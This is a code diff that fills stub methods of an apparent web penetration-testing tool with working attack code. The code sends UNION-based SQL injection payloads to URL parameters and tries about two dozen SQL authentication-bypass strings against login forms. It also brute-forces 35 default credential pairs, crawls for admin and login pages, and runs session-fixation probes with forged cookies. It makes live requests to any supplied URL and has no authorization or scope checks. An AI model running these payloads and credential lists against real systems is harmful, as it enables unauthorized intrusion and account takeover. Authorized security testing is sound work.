@@ -959,7 +959,136 @@ except Exception as e:
         self, url: str, parameter: str, payload: str
     ) -> Dict:
         """Attempt to exploit SQL injection."""
-        return {"success": False, "reason": "Exploitation not implemented"}
+        try:
+            import urllib.request
+            import urllib.parse
+            import urllib.error
+            
+            exploitation_payloads = [
+                f"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
+                f"' UNION SELECT user(),database(),version()--",
+                f"' UNION SELECT table_name FROM information_schema.tables--",
+                f"' UNION SELECT column_name FROM information_schema.columns--",
+                f"' AND 1=1--",
+                f"' OR 1=1--",
+                f"'; SELECT * FROM users--"
+            ]
+            
+            results = {
+                "success": False,
+                "payloads_tested": [],
+                "successful_payloads": [],
+                "extracted_data": [],
+                "error_messages": []
+            }
+            
+            for test_payload in exploitation_payloads:
+                try:
+                    if '?' in url:
+                        test_url = f"{url}&{parameter}={urllib.parse.quote(test_payload)}"
+                    else:
+                        test_url = f"{url}?{parameter}={urllib.parse.quote(test_payload)}"
+                    
+                    results["payloads_tested"].append(test_payload)
+                    
+                    response = urllib.request.urlopen(test_url, timeout=10)
+                    content = response.read().decode('utf-8', errors='ignore')
+                    
+                    success_indicators = [
+                        'mysql',
+                        'postgresql', 
+                        'oracle',
+                        'mssql',
+                        'sqlite',
+                        'information_schema',
+                        'table_name',
+                        'column_name',
+                        'database()',
+                        'user()',
+                        'version()'
+                    ]
+                    
+                    found_indicators = []
+                    for indicator in success_indicators:
+                        if indicator.lower() in content.lower():
+                            found_indicators.append(indicator)
+                    
+                    if found_indicators:
+                        results["successful_payloads"].append({
+                            "payload": test_payload,
+                            "indicators": found_indicators,
+                            "response_snippet": content[:500]
+                        })
+                        results["success"] = True
+                        
+                        if 'user()' in content.lower():
+                            user_match = content.lower().find('user()')
+                            if user_match != -1:
+                                results["extracted_data"].append(f"Database user information found")
+                        
+                        if 'database()' in content.lower():
+                            results["extracted_data"].append(f"Database name information found")
+                            
+                        if 'version()' in content.lower():
+                            results["extracted_data"].append(f"Database version information found")
+                
+                except urllib.error.HTTPError as e:
+                    error_content = e.read().decode('utf-8', errors='ignore')
+                    
+                    sql_error_indicators = [
+                        'sql syntax',
+                        'mysql_fetch',
+                        'ora-',
+                        'microsoft ole db',
+                        'sqlite_',
+                        'postgresql'
+                    ]
+                    
+                    for indicator in sql_error_indicators:
+                        if indicator.lower() in error_content.lower():
+                            results["successful_payloads"].append({
+                                "payload": test_payload,
+                                "type": "error-based",
+                                "error_snippet": error_content[:300]
+                            })
+                            results["success"] = True
+                            break
+                    
+                    results["error_messages"].append({
+                        "payload": test_payload,
+                        "error": str(e),
+                        "content": error_content[:200]
+                    })
+                
+                except Exception as e:
+                    results["error_messages"].append({
+                        "payload": test_payload,
+                        "error": str(e)
+                    })
+            
+            if results["success"]:
+                return {
+                    "success": True,
+                    "exploitation_type": "sql_injection",
+                    "url": url,
+                    "parameter": parameter,
+                    "results": results,
+                    "recommendation": "SQL injection vulnerability successfully exploited. Immediate patching required."
+                }
+            else:
+                return {
+                    "success": False,
+                    "reason": "SQL injection exploitation failed - no successful payloads",
+                    "payloads_tested": len(results["payloads_tested"]),
+                    "errors": results["error_messages"]
+                }
+                
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "reason": "SQL injection exploitation failed due to unexpected error"
+            }
 
     def _classify_sql_injection_types(self, vulnerable_params: List[Dict]) -> List[str]:
         """Classify types of SQL injection found."""
@@ -1510,23 +1639,676 @@ except Exception as e:
 
     async def _find_login_pages(self, url: str) -> List[str]:
         """Find login pages."""
-        return [f"{url}/login", f"{url}/admin", f"{url}/wp-admin"]
+        try:
+            import urllib.request
+            import urllib.parse
+            import urllib.error
+            import re
+            
+            login_pages = []
+            common_paths = [
+                "/login", "/admin", "/wp-admin", "/administrator", "/signin", 
+                "/auth", "/user/login", "/account/login", "/portal", "/dashboard",
+                "/cp", "/control", "/manage", "/panel", "/backend", "/cms"
+            ]
+            
+            for path in common_paths:
+                test_url = f"{url.rstrip('/')}{path}"
+                try:
+                    response = urllib.request.urlopen(test_url, timeout=10)
+                    content = response.read().decode('utf-8', errors='ignore')
+                    
+                    login_indicators = [
+                        r'<input[^>]*type=["\']password["\']',
+                        r'<form[^>]*login',
+                        r'<input[^>]*name=["\']username["\']',
+                        r'<input[^>]*name=["\']email["\']',
+                        r'<input[^>]*name=["\']user["\']',
+                        r'<button[^>]*type=["\']submit["\'][^>]*login',
+                        r'login|signin|authenticate'
+                    ]
+                    
+                    for pattern in login_indicators:
+                        if re.search(pattern, content, re.IGNORECASE):
+                            login_pages.append(test_url)
+                            break
+                            
+                except (urllib.error.HTTPError, urllib.error.URLError):
+                    continue
+                except Exception:
+                    continue
+            
+            try:
+                response = urllib.request.urlopen(url, timeout=10)
+                content = response.read().decode('utf-8', errors='ignore')
+                
+                link_patterns = [
+                    r'href=["\']([^"\']*login[^"\']*)["\']',
+                    r'href=["\']([^"\']*admin[^"\']*)["\']',
+                    r'href=["\']([^"\']*signin[^"\']*)["\']',
+                    r'href=["\']([^"\']*auth[^"\']*)["\']'
+                ]
+                
+                for pattern in link_patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    for match in matches:
+                        if match.startswith('http'):
+                            login_pages.append(match)
+                        else:
+                            login_pages.append(f"{url.rstrip('/')}/{match.lstrip('/')}")
+                            
+            except Exception:
+                pass
+            
+            return list(set(login_pages))
+            
+        except Exception as e:
+            return [f"{url}/login", f"{url}/admin", f"{url}/wp-admin"]
 
     async def _test_session_management(self, url: str) -> Dict:
         """Test session management."""
-        return {}
+        try:
+            import urllib.request
+            import urllib.parse
+            import http.cookiejar
+            import re
+            
+            results = {
+                "session_cookies_found": [],
+                "secure_flags": {},
+                "httponly_flags": {},
+                "session_fixation_vulnerable": False,
+                "session_timeout_tested": False,
+                "csrf_protection": False,
+                "vulnerabilities": []
+            }
+            
+            cookie_jar = http.cookiejar.CookieJar()
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
+            
+            try:
+                response = opener.open(url, timeout=10)
+                content = response.read().decode('utf-8', errors='ignore')
+                
+                for cookie in cookie_jar:
+                    if any(session_name in cookie.name.lower() for session_name in ['session', 'sess', 'jsession', 'phpsession', 'asp.net']):
+                        results["session_cookies_found"].append({
+                            "name": cookie.name,
+                            "value": (cookie.value[:20] + "..." if cookie.value and len(cookie.value) > 20 else cookie.value) if cookie.value else "",
+                            "domain": cookie.domain,
+                            "path": cookie.path,
+                            "secure": cookie.secure,
+                            "httponly": hasattr(cookie, 'httponly') and getattr(cookie, 'httponly', False)
+                        })
+                        
+                        results["secure_flags"][cookie.name] = cookie.secure
+                        results["httponly_flags"][cookie.name] = hasattr(cookie, 'httponly') and getattr(cookie, 'httponly', False)
+                        
+                        if not cookie.secure:
+                            results["vulnerabilities"].append(f"Session cookie '{cookie.name}' missing Secure flag")
+                        if not (hasattr(cookie, 'httponly') and getattr(cookie, 'httponly', False)):
+                            results["vulnerabilities"].append(f"Session cookie '{cookie.name}' missing HttpOnly flag")
+                
+                csrf_patterns = [
+                    r'<input[^>]*name=["\']csrf[^"\']*["\']',
+                    r'<input[^>]*name=["\']_token["\']',
+                    r'<meta[^>]*name=["\']csrf-token["\']',
+                    r'X-CSRF-TOKEN',
+                    r'authenticity_token'
+                ]
+                
+                for pattern in csrf_patterns:
+                    if re.search(pattern, content, re.IGNORECASE):
+                        results["csrf_protection"] = True
+                        break
+                
+                if not results["csrf_protection"]:
+                    results["vulnerabilities"].append("No CSRF protection detected")
+                
+                try:
+                    custom_session_id = "DEVIN_TEST_SESSION_12345"
+                    headers = {'Cookie': f'PHPSESSID={custom_session_id}; JSESSIONID={custom_session_id}'}
+                    
+                    req = urllib.request.Request(url, headers=headers)
+                    response2 = urllib.request.urlopen(req, timeout=10)
+                    
+                    response_headers = dict(response2.headers)
+                    set_cookie = response_headers.get('Set-Cookie', '')
+                    
+                    if custom_session_id in set_cookie:
+                        results["session_fixation_vulnerable"] = True
+                        results["vulnerabilities"].append("Potential session fixation vulnerability detected")
+                        
+                except Exception:
+                    pass
+                
+            except Exception as e:
+                results["error"] = str(e)
+            
+            return results
+            
+        except Exception as e:
+            return {"error": str(e), "vulnerabilities": ["Session management testing failed"]}
 
     async def _test_sql_auth_bypass(self, login_url: str) -> Dict:
         """Test SQL injection authentication bypass."""
-        return {"success": False}
+        try:
+            import urllib.request
+            import urllib.parse
+            import urllib.error
+            
+            results = {
+                "success": False,
+                "payloads_tested": [],
+                "successful_payloads": [],
+                "response_indicators": [],
+                "vulnerabilities": []
+            }
+            
+            # SQL injection authentication bypass payloads
+            bypass_payloads = [
+                "admin' --",
+                "admin'/*",
+                "' OR '1'='1' --",
+                "' OR 1=1 --",
+                "admin' OR '1'='1",
+                "admin' OR 1=1#",
+                "' OR 'a'='a",
+                "') OR ('1'='1' --",
+                "') OR (1=1) --",
+                "' UNION SELECT 1,1,1 WHERE '1'='1' --",
+                "admin'; --",
+                "' OR 1=1/*",
+                "anything' OR 'x'='x",
+                "x' OR 1=1 OR 'x'='y",
+                "' OR username IS NOT NULL OR username='",
+                "' OR 1/*",
+                "admin'--",
+                "admin' #",
+                "admin'/*",
+                "' or 1=1#",
+                "' or 1=1--",
+                "' or 1=1/*",
+                "') or '1'='1--",
+                "') or ('1'='1--"
+            ]
+            
+            password_payloads = [
+                "anything",
+                "' OR '1'='1",
+                "' OR 1=1 --",
+                "password",
+                "admin"
+            ]
+            
+            for username_payload in bypass_payloads:
+                for password_payload in password_payloads:
+                    try:
+                        post_data = {
+                            'username': username_payload,
+                            'password': password_payload,
+                            'user': username_payload,
+                            'email': username_payload,
+                            'login': 'Login',
+                            'submit': 'Submit'
+                        }
+                        
+                        encoded_data = urllib.parse.urlencode(post_data).encode('utf-8')
+                        
+                        results["payloads_tested"].append({
+                            "username": username_payload,
+                            "password": password_payload
+                        })
+                        
+                        req = urllib.request.Request(login_url, data=encoded_data)
+                        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+                        req.add_header('User-Agent', 'Mozilla/5.0 (compatible; SecurityTest)')
+                        
+                        try:
+                            response = urllib.request.urlopen(req, timeout=10)
+                            content = response.read().decode('utf-8', errors='ignore')
+                            
+                            success_indicators = [
+                                'dashboard',
+                                'welcome',
+                                'logout',
+                                'profile',
+                                'admin panel',
+                                'control panel',
+                                'successfully logged in',
+                                'authentication successful'
+                            ]
+                            
+                            if response.getcode() in [302, 301, 303]:
+                                location = response.headers.get('Location', '')
+                                if any(indicator in location.lower() for indicator in ['dashboard', 'admin', 'panel', 'home']):
+                                    results["successful_payloads"].append({
+                                        "username": username_payload,
+                                        "password": password_payload,
+                                        "indicator": f"Redirect to {location}",
+                                        "response_code": response.getcode()
+                                    })
+                                    results["success"] = True
+                            
+                            # Check content for success indicators
+                            for indicator in success_indicators:
+                                if indicator.lower() in content.lower():
+                                    results["successful_payloads"].append({
+                                        "username": username_payload,
+                                        "password": password_payload,
+                                        "indicator": indicator,
+                                        "content_snippet": content[:300]
+                                    })
+                                    results["success"] = True
+                                    break
+                            
+                            error_indicators = [
+                                'invalid',
+                                'incorrect',
+                                'failed',
+                                'error',
+                                'wrong',
+                                'denied'
+                            ]
+                            
+                            has_error = any(error.lower() in content.lower() for error in error_indicators)
+                            
+                            if not has_error and len(content) > 1000:  # Substantial content without errors
+                                results["response_indicators"].append({
+                                    "username": username_payload,
+                                    "password": password_payload,
+                                    "note": "No error messages detected, substantial response content"
+                                })
+                        
+                        except urllib.error.HTTPError as e:
+                            if e.code in [302, 301, 303]:
+                                location = e.headers.get('Location', '')
+                                if location:
+                                    results["successful_payloads"].append({
+                                        "username": username_payload,
+                                        "password": password_payload,
+                                        "indicator": f"HTTP {e.code} redirect to {location}",
+                                        "response_code": e.code
+                                    })
+                                    results["success"] = True
+                        
+                        except Exception:
+                            continue
+                    
+                    except Exception:
+                        continue
+                    
+                    if len(results["payloads_tested"]) > 50:
+                        break
+                
+                if len(results["payloads_tested"]) > 50:
+                    break
+            
+            if results["success"]:
+                results["vulnerabilities"].append("SQL injection authentication bypass vulnerability detected")
+                return {
+                    "success": True,
+                    "vulnerability_type": "sql_auth_bypass",
+                    "results": results,
+                    "recommendation": "Critical: SQL injection in authentication allows bypass. Immediate patching required."
+                }
+            else:
+                return {
+                    "success": False,
+                    "payloads_tested": len(results["payloads_tested"]),
+                    "reason": "No successful SQL authentication bypass detected"
+                }
+                
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "reason": "SQL authentication bypass testing failed"
+            }
 
     async def _test_default_credentials(self, login_url: str) -> Dict:
         """Test default credentials."""
-        return {"success": False}
+        try:
+            import urllib.request
+            import urllib.parse
+            import urllib.error
+            
+            results = {
+                "success": False,
+                "credentials_tested": [],
+                "successful_credentials": [],
+                "response_details": []
+            }
+            
+            default_creds = [
+                ('admin', 'admin'),
+                ('admin', 'password'),
+                ('admin', ''),
+                ('administrator', 'administrator'),
+                ('administrator', 'password'),
+                ('root', 'root'),
+                ('root', 'toor'),
+                ('root', ''),
+                ('guest', 'guest'),
+                ('guest', ''),
+                ('user', 'user'),
+                ('user', 'password'),
+                ('test', 'test'),
+                ('demo', 'demo'),
+                ('admin', '123456'),
+                ('admin', 'admin123'),
+                ('admin', 'letmein'),
+                ('admin', 'welcome'),
+                ('admin', 'qwerty'),
+                ('sa', ''),
+                ('sa', 'sa'),
+                ('operator', 'operator'),
+                ('manager', 'manager'),
+                ('support', 'support'),
+                ('service', 'service'),
+                ('postgres', 'postgres'),
+                ('mysql', 'mysql'),
+                ('oracle', 'oracle'),
+                ('tomcat', 'tomcat'),
+                ('jenkins', 'jenkins'),
+                ('nagios', 'nagios'),
+                ('zabbix', 'zabbix'),
+                ('elastic', 'elastic'),
+                ('kibana', 'kibana'),
+                ('grafana', 'grafana')
+            ]
+            
+            for username, password in default_creds:
+                try:
+                    post_data = {
+                        'username': username,
+                        'password': password,
+                        'user': username,
+                        'email': username,
+                        'login': 'Login',
+                        'submit': 'Submit'
+                    }
+                    
+                    encoded_data = urllib.parse.urlencode(post_data).encode('utf-8')
+                    
+                    results["credentials_tested"].append({
+                        "username": username,
+                        "password": password
+                    })
+                    
+                    req = urllib.request.Request(login_url, data=encoded_data)
+                    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
+                    req.add_header('User-Agent', 'Mozilla/5.0 (compatible; SecurityTest)')
+                    
+                    try:
+                        response = urllib.request.urlopen(req, timeout=10)
+                        content = response.read().decode('utf-8', errors='ignore')
+                        
+                        success_indicators = [
+                            'dashboard',
+                            'welcome',
+                            'logout',
+                            'profile',
+                            'admin panel',
+                            'control panel',
+                            'successfully logged in',
+                            'authentication successful',
+                            'home page',
+                            'main menu'
+                        ]
+                        
+                        if response.getcode() in [302, 301, 303]:
+                            location = response.headers.get('Location', '')
+                            if location and not any(fail_indicator in location.lower() for fail_indicator in ['login', 'error', 'fail']):
+                                results["successful_credentials"].append({
+                                    "username": username,
+                                    "password": password,
+                                    "indicator": f"Redirect to {location}",
+                                    "response_code": response.getcode()
+                                })
+                                results["success"] = True
+                        
+                        # Check content for success indicators
+                        for indicator in success_indicators:
+                            if indicator.lower() in content.lower():
+                                results["successful_credentials"].append({
+                                    "username": username,
+                                    "password": password,
+                                    "indicator": indicator,
+                                    "content_snippet": content[:300]
+                                })
+                                results["success"] = True
+                                break
+                        
+                        error_indicators = [
+                            'invalid username',
+                            'invalid password',
+                            'incorrect',
+                            'authentication failed',
+                            'login failed',
+                            'access denied',
+                            'wrong credentials'
+                        ]
+                        
+                        has_error = any(error.lower() in content.lower() for error in error_indicators)
+                        
+                        if not has_error and len(content) > 1000:
+                            results["response_details"].append({
+                                "username": username,
+                                "password": password,
+                                "note": "No error messages, substantial content - potential success",
+                                "content_length": len(content)
+                            })
+                    
+                    except urllib.error.HTTPError as e:
+                        if e.code in [302, 301, 303]:
+                            location = e.headers.get('Location', '')
+                            if location and not any(fail_indicator in location.lower() for fail_indicator in ['login', 'error', 'fail']):
+                                results["successful_credentials"].append({
+                                    "username": username,
+                                    "password": password,
+                                    "indicator": f"HTTP {e.code} redirect to {location}",
+                                    "response_code": e.code
+                                })
+                                results["success"] = True
+                    
+                    except Exception:
+                        continue
+                
+                except Exception:
+                    continue
+            
+            if results["success"]:
+                return {
+                    "success": True,
+                    "vulnerability_type": "default_credentials",
+                    "successful_credentials": results["successful_credentials"],
+                    "credentials_tested": len(results["credentials_tested"]),
+                    "recommendation": "Default credentials found. Change immediately to secure passwords."
+                }
+            else:
+                return {
+                    "success": False,
+                    "credentials_tested": len(results["credentials_tested"]),
+                    "reason": "No default credentials found",
+                    "response_details": results["response_details"]
+                }
+                
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "reason": "Default credential testing failed"
+            }
 
     async def _test_session_fixation(self, login_url: str) -> Dict:
         """Test session fixation."""
-        return {"success": False}
+        try:
+            import urllib.request
+            import urllib.parse
+            import urllib.error
+            import http.cookiejar
+            import uuid
+            
+            results = {
+                "success": False,
+                "test_details": [],
+                "vulnerabilities": [],
+                "session_behavior": {}
+            }
+            
+            try:
+                custom_session_id = f"DEVIN_TEST_{uuid.uuid4().hex[:16]}"
+                
+                cookie_jar = http.cookiejar.CookieJar()
+                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
+                
+                session_cookie_names = ['PHPSESSID', 'JSESSIONID', 'SESSIONID', 'SESSION', 'SID']
+                
+                for cookie_name in session_cookie_names:
+                    try:
+                        headers = {'Cookie': f'{cookie_name}={custom_session_id}'}
+                        
+                        req = urllib.request.Request(login_url, headers=headers)
+                        response1 = opener.open(req, timeout=10)
+                        content1 = response1.read().decode('utf-8', errors='ignore')
+                        
+                        results["test_details"].append({
+                            "step": "initial_request",
+                            "cookie_name": cookie_name,
+                            "custom_session_id": custom_session_id,
+                            "response_code": response1.getcode()
+                        })
+                        
+                        post_data = {
+                            'username': 'admin',
+                            'password': 'admin',
+                            'user': 'admin',
+                            'email': 'admin',
+                            'login': 'Login',
+                            'submit': 'Submit'
+                        }
+                        
+                        encoded_data = urllib.parse.urlencode(post_data).encode('utf-8')
+                        
+                        req2 = urllib.request.Request(login_url, data=encoded_data, headers=headers)
+                        req2.add_header('Content-Type', 'application/x-www-form-urlencoded')
+                        
+                        try:
+                            response2 = opener.open(req2, timeout=10)
+                            content2 = response2.read().decode('utf-8', errors='ignore')
+                            
+                            response_headers = dict(response2.headers)
+                            set_cookie_header = response_headers.get('Set-Cookie', '')
+                            
+                            results["test_details"].append({
+                                "step": "authentication_attempt",
+                                "cookie_name": cookie_name,
+                                "response_code": response2.getcode(),
+                                "set_cookie_header": set_cookie_header[:200] if set_cookie_header else None
+                            })
+                            
+                            if custom_session_id in set_cookie_header:
+                                results["vulnerabilities"].append({
+                                    "type": "session_fixation",
+                                    "cookie_name": cookie_name,
+                                    "description": f"Custom session ID {custom_session_id} was accepted and maintained",
+                                    "severity": "high"
+                                })
+                                results["success"] = True
+                            
+                            elif set_cookie_header and cookie_name.lower() in set_cookie_header.lower():
+                                import re
+                                pattern = f'{cookie_name}=([^;]+)'
+                                match = re.search(pattern, set_cookie_header, re.IGNORECASE)
+                                if match:
+                                    new_session_id = match.group(1)
+                                    if new_session_id != custom_session_id:
+                                        results["session_behavior"][cookie_name] = {
+                                            "regenerated": True,
+                                            "old_id": custom_session_id,
+                                            "new_id": new_session_id[:20] + "..." if len(new_session_id) > 20 else new_session_id
+                                        }
+                                    else:
+                                        results["vulnerabilities"].append({
+                                            "type": "session_fixation",
+                                            "cookie_name": cookie_name,
+                                            "description": "Session ID not regenerated after authentication",
+                                            "severity": "medium"
+                                        })
+                                        results["success"] = True
+                            
+                            if custom_session_id in content2 or any(indicator in content2.lower() for indicator in ['dashboard', 'welcome', 'logout']):
+                                results["vulnerabilities"].append({
+                                    "type": "session_fixation_exploitation",
+                                    "cookie_name": cookie_name,
+                                    "description": "Successfully accessed authenticated content with fixed session ID",
+                                    "severity": "critical"
+                                })
+                                results["success"] = True
+                        
+                        except urllib.error.HTTPError as e:
+                            results["test_details"].append({
+                                "step": "authentication_attempt",
+                                "cookie_name": cookie_name,
+                                "error": f"HTTP {e.code}",
+                                "location": e.headers.get('Location', '') if hasattr(e, 'headers') else ''
+                            })
+                            
+                            if hasattr(e, 'headers') and e.headers.get('Location'):
+                                location = e.headers.get('Location')
+                                if location and custom_session_id in location:
+                                    results["vulnerabilities"].append({
+                                        "type": "session_fixation_redirect",
+                                        "cookie_name": cookie_name,
+                                        "description": f"Custom session ID found in redirect location: {location}",
+                                        "severity": "high"
+                                    })
+                                    results["success"] = True
+                        
+                        except Exception as e:
+                            results["test_details"].append({
+                                "step": "authentication_attempt",
+                                "cookie_name": cookie_name,
+                                "error": str(e)
+                            })
+                    
+                    except Exception as e:
+                        results["test_details"].append({
+                            "step": "initial_request",
+                            "cookie_name": cookie_name,
+                            "error": str(e)
+                        })
+                        continue
+            
+            except Exception as e:
+                results["test_details"].append({
+                    "step": "setup",
+                    "error": str(e)
+                })
+            
+            if results["success"]:
+                return {
+                    "success": True,
+                    "vulnerability_type": "session_fixation",
+                    "vulnerabilities": results["vulnerabilities"],
+                    "test_details": results["test_details"],
+                    "recommendation": "Session fixation vulnerability detected. Implement session regeneration after authentication."
+                }
+            else:
+                return {
+                    "success": False,
+                    "reason": "No session fixation vulnerabilities detected",
+                    "session_behavior": results["session_behavior"],
+                    "test_details": results["test_details"]
+                }
+                
+        except Exception as e:
+            return {
+                "success": False,
+                "error": str(e),
+                "reason": "Session fixation testing failed"
+            }
 
     def _generate_exploitation_recommendations(
         self, prioritized_findings: List[Dict]
